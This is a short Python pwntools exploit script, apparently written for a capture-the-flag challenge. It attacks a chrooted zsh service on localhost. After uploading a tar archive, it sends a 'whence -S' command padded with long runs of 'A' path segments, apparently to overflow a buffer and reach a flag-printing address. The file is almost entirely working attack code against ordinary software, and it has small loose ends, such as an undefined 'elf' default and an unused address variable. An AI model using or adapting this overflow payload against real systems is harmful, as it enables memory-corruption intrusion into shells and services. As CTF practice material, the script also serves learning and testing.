#!/usr/bin/env python
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])  # horizontal split window


RHOST = "localhost"
RPORT = 10206
LHOST = "127.0.0.1"
LPORT = 10206

def section_addr(name, elf=elf):
    return elf.get_section_by_name(name).header['sh_addr']

def dbg(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

conn = None
opt = sys.argv.pop(1) if len(sys.argv) > 1 else '?'  # pop option
if opt in 'rl':
    conn = remote(*{'r': (RHOST, RPORT), 'l': (LHOST, LPORT)}[opt])
elif opt == 'd':
    gdbscript = """
    
    continue
    """.format(hex(elf.symbols['main'] if 'main' in elf.symbols.keys() else elf.entrypoint))
    conn = gdb.debug(['./chroot/bin/zsh'], gdbscript=gdbscript)
else:
    conn = process(['./chroot/bin/zsh'])
    # conn = process(['./chroot/bin/zsh'], env={'LD_PRELOAD': ''})
    if opt == 'a': gdb.attach(conn)

# exploit
log.info('Pwning')

tar = open("./a.tar.gz").read()
conn.sendlineafter("Size", str(len(tar)))
conn.send(tar)

get_flag = 0x48f6b0
raw_input()
conn.sendline('whence -S /tmp/_your_tar_file_is_extracted_here_plz_enjoy/' + ('A'*0xff+'/')*15 + 'a'*0x5a+ '/hoge' ) 
conn.interactive()
